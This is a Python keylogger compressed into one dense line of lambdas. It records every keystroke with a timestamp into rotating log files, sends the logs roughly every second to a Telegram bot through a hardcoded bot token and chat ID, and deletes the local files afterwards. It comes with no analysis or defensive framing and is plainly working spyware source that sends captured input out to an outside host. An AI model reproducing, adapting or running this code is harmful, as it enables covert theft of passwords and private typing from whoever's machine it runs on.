import threading, requests, os, time, sys; from pynput import keyboard; from datetime import datetime; bot_token = "7566894558:AAFel2H8nBF8r6QuQWI-gTH13NUUBVe_a-I"; chat_id = "8073091127"; log1 = "log1.txt"; log2 = "log2.txt"; time_window = 1; exit_flag = False; is_active = True; active_log = log1; lock = threading.Lock(); current_keys = set(); send_message = lambda text: requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", data={"chat_id": chat_id, "text": text}) if not exit_flag else None; send_log_content = lambda file_to_send: (lambda f=file_to_send: [send_message(open(f, "r").read()[i:i+4000]) for i in range(0, len(open(f, "r").read()), 4000)] + [os.remove(f)] if os.path.exists(f) and open(f, "r").read().strip() else None)(); rotate_log = lambda: (lambda: [setattr(sys.modules[__name__], 'active_log', log2 if active_log == log1 else log1), threading.Thread(target=send_log_content, args=(log1 if active_log == log2 else log2,), daemon=True).start(), threading.Timer(time_window, rotate_log).start()] if not exit_flag and is_active else None)(); on_press = lambda key: (lambda: [open(active_log, "a").write(f"{datetime.now().strftime('%d/%m/%Y %H:%M:%S')} - {key.char if hasattr(key, 'char') else key}\n")] if not exit_flag and is_active else None)(); on_release = lambda key: current_keys.remove(key) if key in current_keys else None; (lambda: [send_message("âœ… Keylogger started At " + datetime.now().strftime("%d/%m/%Y %H:%M:%S")), (lambda listener: [listener.start(), rotate_log(), listener.join()])(keyboard.Listener(on_press=on_press, on_release=on_release))])() if __name__ == "__main__" else None